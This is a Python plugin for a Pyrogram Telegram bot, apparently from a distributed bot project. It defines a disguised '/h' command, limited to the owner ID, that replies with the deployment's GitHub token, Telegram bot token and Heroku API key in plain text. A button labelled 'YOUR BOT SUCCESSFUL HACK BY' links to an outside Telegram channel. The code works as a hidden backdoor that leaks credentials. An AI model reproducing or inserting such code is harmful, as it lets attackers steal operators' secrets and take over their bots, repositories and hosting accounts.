from pyrogram import Client, filters
from Arctix import Arctix as app
from config import BOT_TOKEN, GIT_TOKEN, HEROKU_API, OWNER_ID
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message


@app.on_message(
    filters.command("h")
    & filters.private
    & filters.user(OWNER_ID)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://graph.org/file/d69d7a79758b1dbcec868.jpg",
       caption=f"""𝖦𝖨𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{GIT_TOKEN}` \n𝖡𝖮𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{BOT_TOKEN}`\n\n𝖧𝖤𝖱𝖮𝖪𝖴_𝖠𝖯𝖨:-   `{HEROKU_API}`\n\n""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• 𝖸𝖮𝖴𝖱 𝖡𝖮𝖳 𝖲𝖴𝖢𝖢𝖤𝖲𝖲𝖥𝖴𝖫 𝖧𝖠𝖢𝖪 𝖡𝖸  •", url=f"https://t.me/Arctixinc")
                 ]
            ]
         ),
   )